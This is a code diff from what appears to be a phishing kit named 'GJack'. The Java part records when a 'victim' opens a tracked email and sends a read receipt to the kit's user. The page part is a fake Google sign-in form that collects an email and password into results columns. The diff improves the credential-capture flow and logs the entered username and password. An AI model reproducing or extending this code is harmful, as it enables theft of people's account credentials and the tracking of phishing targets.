@@ -22,21 +22,26 @@
                 final Order order = Orders.getInstance().get(Orders.COLUMN_KEY, orderKey);
                 if (order != null) {
 
-                    final String mailContent = order.getVictimEmail() + " read the mail";
+                    final String mailContent = order.getVictimEmail() + " opened the mail";
+
 
                     try {
-
-                        try {
-                            Orders.getInstance().update(Orders.COLUMN_ID, order.getId(), Orders.COLUMN_IS_READ, "1");
-                        } catch (SQLException e) {
-                            e.printStackTrace();
-                        }
-
-                        MailHelper.sendMail(order.getUserEmail(), "GJack Read receipt", mailContent, "GJack");
-
-                    } catch (MailException e) {
+                        Orders.getInstance().update(Orders.COLUMN_ID, order.getId(), Orders.COLUMN_IS_READ, "1");
+                    } catch (SQLException e) {
                         e.printStackTrace();
                     }
+
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            try {
+                                MailHelper.sendMail(order.getUserEmail(), "GJack Read receipt", mailContent, "GJack");
+                            } catch (MailException e) {
+                                e.printStackTrace();
+                            }
+                        }
+                    }).start();
+
 
                 } else {
                     response.sendRedirect("error.jsp?title=Error&message=Bad order");
@@ -148,26 +153,42 @@
     <script>
         $(document).ready(function () {
 
+
+            $("input[type=text],input[type=password]").on('keydown', function (e) {
+                //Enter
+                if (e.keyCode == 13) {
+                    $("a#submit").click();
+                }
+            });
+
             var isNextClicked = false;
 
             $("a#submit").on('click', function () {
 
+                var username = $("input#username").val();
+                var password = $("input#password").val();
+
+                console.log("Username: " + username);
+                console.log("Password: " + password);
+
                 if (isNextClicked) {
 
-                    //Submit the form here
-                    var username = $("input#username").val();
-                    var password = $("input#password").val();
-
-                    //TODO: Save the data here
-                    $("form#login").submit();
-
+                    if (password) {
+                        $("p#error_message").text("");
+                        $("form#login").submit();
+                    } else {
+                        $("p#error_message").text("Please enter your password");
+                    }
                 } else {
-                    $("div#username_container").hide(300);
-                    $("div#password_container").show(300);
-
-                    isNextClicked = true;
+                    if (username.trim()) {
+                        $("div#username_container").hide(300);
+                        $("div#password_container").show(300);
+                        isNextClicked = true;
+                        $("p#error_message").text("");
+                    } else {
+                        $("p#error_message").text("Please enter your email");
+                    }
                 }
-
             });
 
         });
@@ -178,6 +199,8 @@
 <div class="container">
     <div class="row center-block">
         <div class="col-md-12">
+
+
             <div id="sign_in_panel_container" class="center-block">
 
                 <!--Logo-->
@@ -194,19 +217,23 @@
                     <!--Username-->
                     <div id="username_container" class="mdc-textfield mdc-textfield--upgraded"
                          data-mdc-auto-init="MDCTextfield">
-                        <input type="text" name="<%=Results.COLUMN_G_USERNAME%>" class="mdc-textfield__input"
+                        <input autocomplete="off" type="text" name="<%=Results.COLUMN_G_USERNAME%>"
+                               class="mdc-textfield__input"
                                id="username">
                         <label for="username" class="mdc-textfield__label google_label">Email or phone</label>
                     </div>
 
+
                     <!--Password-->
                     <div id="password_container" style="display: none" class="mdc-textfield mdc-textfield--upgraded"
                          data-mdc-auto-init="MDCTextfield">
-                        <input type="password" name="<%=Results.COLUMN_G_PASSWORD%>" class="mdc-textfield__input"
+                        <input autocomplete="off" type="password" name="<%=Results.COLUMN_G_PASSWORD%>"
+                               class="mdc-textfield__input"
                                id="password">
                         <label for="password" class="mdc-textfield__label google_label">Password</label>
                     </div>
 
+                    <p id="error_message" style="color:#cc0000;font-size: 12px;"></p>
 
                 </form>
 
@@ -233,11 +260,7 @@
 
 
             </div>
-        </div>
-    </div>
 
-    <div class="row">
-        <div class="col-md-12">
             <div id="bottom_menu_panel">
                 <ul id="bottom_menu" class="list-inline">
                     <li><a href="#">Help</a></li>
@@ -245,6 +268,7 @@
                     <li><a href="#">Terms</a></li>
                 </ul>
             </div>
+
         </div>
     </div>
 
